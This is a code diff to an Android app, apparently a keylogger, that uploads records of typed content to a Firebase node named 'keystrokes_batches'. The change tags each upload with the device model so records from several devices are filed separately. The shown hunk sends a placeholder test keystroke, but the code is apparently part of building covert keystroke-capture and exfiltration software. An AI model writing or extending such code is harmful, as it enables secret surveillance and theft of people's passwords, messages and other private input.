@@ -7,6 +7,7 @@ import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
 import android.view.inputmethod.InputMethodManager
@@ -140,21 +141,23 @@ class MainActivity : Activity() {
                 try {
                     val database = FirebaseDatabase.getInstance()
                     val ref = database.getReference("keystrokes_batches")
+                    val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
                     val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", Locale.getDefault()).format(Date())
                     val testData = mapOf(
+                        "deviceName" to deviceName,
                         "appName" to "test.app",
                         "timestamp" to System.currentTimeMillis(),
                         "typedContent" to "Manual test keystroke at $timestampKey"
                     )
 
-                    ref.child("test_app").child(timestampKey).setValue(testData)
+                    ref.child(deviceName).child("test_app").child(timestampKey).setValue(testData)
                         .addOnSuccessListener {
                             Toast.makeText(this, "Test sync successful!", Toast.LENGTH_SHORT).show()
-                            LogStore.addLog("Manual test sync SUCCESS")
+                            LogStore.addLog("[$deviceName] Manual test sync SUCCESS")
                         }
                         .addOnFailureListener { e: Exception ->
                             Toast.makeText(this, "Test sync failed: ${e.message}", Toast.LENGTH_LONG).show()
-                            LogStore.addLog("Manual test sync FAILED: ${e.toString()}")
+                            LogStore.addLog("[$deviceName] Manual test sync FAILED: ${e.toString()}")
                         }
                 } catch (e: Exception) {
                     Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_LONG).show()
